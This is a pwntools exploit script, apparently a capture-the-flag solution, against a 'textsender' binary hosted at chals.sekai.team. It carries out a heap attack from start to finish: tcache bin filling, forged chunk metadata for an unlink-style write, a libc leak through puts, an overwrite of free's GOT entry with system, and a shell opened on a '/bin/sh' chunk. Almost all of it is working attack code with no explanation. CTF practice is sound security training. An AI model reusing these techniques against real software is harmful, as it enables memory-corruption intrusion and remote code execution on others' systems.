#!/usr/bin/python3

from pwn import *

exe = ELF("textsender_patched", checksec=False)
libc = ELF("./libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""

                # b* 0x00000000004016b5
                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("chals.sekai.team", 4000)
else:
    p = process(exe.path)

GDB()


def add(idx, payload):
    sla(b"> ", b"2")
    sla(b": ", idx)
    sla(b": ", payload)


def send():
    sla(b"> ", b"5")


def edit(idx):
    sla(b"> ", b"3")
    sla(b": ", idx)

def setname(payload):
    sla(b"> ", b"1")
    sla(b": ", payload)
    
def fill_bin():
    add("wan", b'bbbb')
    add("wan", b'bbbb')
    add("wan", b'bbbb')
    add("wan", b'/bin/sh')
    add("2", b'bbbb')
    add("2", b'bbbb')
fill_bin()
setname(b'a')
send()  

fill_bin()
add("wan",b"b")
edit("6"*0x75)
send()

fill_bin()
add("wan",b"b")
add("wan",b"b")
edit("6"*0x75)
send()
fill_bin()
add("wan",b"b")
add("wan",b"b")
add("wan",b"b")
add("wan",b"b")
edit("6"*0x75)
send()

presize = 0x870
fill_bin()
add("1",b"b")
add(b"a" * 0x70 + p64(presize),b"b")
add("3",b"b")
add(p64(0) + p64(presize) + p64(exe.sym.sender-0x18) + p64(exe.sym.sender - 0x10),b"b")
send()
fill_bin()
add("wan",b"b")
add("\0",b"b")
add("\0",b"b")
add(b'9',b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(0x404028))
sla(b'> ', b'4')
p.recvlines(7)
p.recvuntil(b'6) ')
libc.address = u64(p.recvuntil(b':', drop=True) + b'\0\0') - libc.sym.puts
info(hex(libc.address))
edit(b'9')
payload = b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(exe.got.free)
sla(b": ", payload)
edit(p64(libc.address + 0x77ec0))
sla(b': ', p64(libc.sym.system))
send()
p.interactive()
